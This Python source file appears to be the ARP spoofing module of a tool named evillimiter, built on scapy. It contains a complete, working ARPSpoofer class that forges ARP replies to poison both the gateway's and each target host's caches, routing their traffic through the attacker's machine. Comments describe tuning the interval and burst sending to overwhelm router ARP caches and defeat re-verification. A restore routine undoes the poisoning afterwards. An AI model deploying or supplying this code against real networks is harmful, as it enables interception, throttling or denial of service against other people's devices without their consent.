import time
import logging
import threading
from scapy.all import Ether, ARP, conf, get_if_hwaddr # pylint: disable=no-name-in-module

# suppress scapy's noisy ARP warnings ("You should be providing the Ethernet
# destination MAC address when sending an is-at ARP") — we handle L2 headers manually
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer(object):
    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.5, burst_count=3):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac

        # resolve attacker's own MAC once at init (used in L2 frame construction)
        self._attacker_mac = get_if_hwaddr(interface)

        # interval in seconds between spoofed ARP packet cycles
        # default 0.5s (aggressive) to outpace 5G router ARP re-verification
        self.interval = interval

        # number of times each ARP packet is sent per cycle
        # burst helps overwhelm the router's ARP cache before it can re-learn
        self.burst_count = burst_count

        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._running = False
        self._socket = None

    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)

        host.spoofed = True

    def remove(self, host, restore=True):             
        with self._hosts_lock:
            self._hosts.discard(host)

        if restore:
            self._restore(host)

        host.spoofed = False

    def start(self):
        self._running = True

        thread = threading.Thread(target=self._spoof, args=[], daemon=True)
        thread.start()

    def stop(self):
        self._running = False

    def _open_socket(self):
        """Open a persistent L2 raw socket for fast packet injection"""
        try:
            self._socket = conf.L2socket(iface=self.interface)
        except OSError as e:
            self._socket = None
            raise

    def _close_socket(self):
        """Safely close the persistent socket"""
        if self._socket is not None:
            try:
                self._socket.close()
            except Exception:
                pass
            finally:
                self._socket = None

    def _build_l2_packets(self, host):
        """
        Pre-construct full Layer-2 Ethernet frames.
        Zero runtime route lookup or MAC resolution overhead.
        """
        return [
            # Poison gateway: "host.ip is at attacker's MAC"
            Ether(src=self._attacker_mac, dst=self.gateway_mac) /
            ARP(op=2,
                hwsrc=self._attacker_mac, psrc=host.ip,
                hwdst=self.gateway_mac, pdst=self.gateway_ip),

            # Poison target: "gateway_ip is at attacker's MAC"
            Ether(src=self._attacker_mac, dst=host.mac) /
            ARP(op=2,
                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
                hwdst=host.mac, pdst=host.ip)
        ]

    def _build_restore_packets(self, host):
        """
        Construct legitimate ARP packets that restore the real MAC mappings.
        Sent to broadcast to ensure all devices update their ARP tables.
        """
        return [
            # Tell gateway: "host.ip is at host's REAL MAC"
            Ether(src=host.mac, dst=BROADCAST) /
            ARP(op=2,
                hwsrc=host.mac, psrc=host.ip,
                hwdst=BROADCAST, pdst=self.gateway_ip),

            # Tell target: "gateway_ip is at gateway's REAL MAC"
            Ether(src=self.gateway_mac, dst=BROADCAST) /
            ARP(op=2,
                hwsrc=self.gateway_mac, psrc=self.gateway_ip,
                hwdst=BROADCAST, pdst=host.ip)
        ]

    def _spoof(self):
        """
        Main spoofing loop with persistent socket and resilient error handling.
        Thread will not die silently on network errors.
        """
        consecutive_errors = 0
        max_consecutive_errors = 10

        # open persistent L2 socket once — reused for all sends
        try:
            self._open_socket()
        except OSError:
            self._running = False
            return

        try:
            while self._running:
                try:
                    self._hosts_lock.acquire()
                    hosts = self._hosts.copy()
                    self._hosts_lock.release()

                    # build all packets for all hosts, then send in rapid burst
                    all_packets = []
                    for host in hosts:
                        if not self._running:
                            return
                        all_packets.extend(self._build_l2_packets(host))

                    # burst-send: each packet sent burst_count times via raw socket
                    for pkt in all_packets:
                        for _ in range(self.burst_count):
                            self._socket.send(pkt)

                    consecutive_errors = 0
                    time.sleep(self.interval)

                except OSError as e:
                    # network buffer full, interface down, permission error
                    consecutive_errors += 1

                    if consecutive_errors >= max_consecutive_errors:
                        self._running = False
                        return

                    # attempt to reopen socket in case interface was reset
                    self._close_socket()
                    time.sleep(1)
                    try:
                        self._open_socket()
                    except OSError:
                        pass

                except Exception:
                    consecutive_errors += 1
                    if consecutive_errors >= max_consecutive_errors:
                        self._running = False
                        return
                    time.sleep(0.5)
        finally:
            self._close_socket()

    def _restore(self, host):
        """
        Remaps host and gateway to their actual addresses.
        Uses a temporary socket with retry logic for reliability.
        """
        packets = self._build_restore_packets(host)
        restore_count = 5

        for attempt in range(3):
            try:
                sock = conf.L2socket(iface=self.interface)
                try:
                    for pkt in packets:
                        for _ in range(restore_count):
                            sock.send(pkt)
                    return  # success
                finally:
                    sock.close()
            except OSError:
                time.sleep(0.1)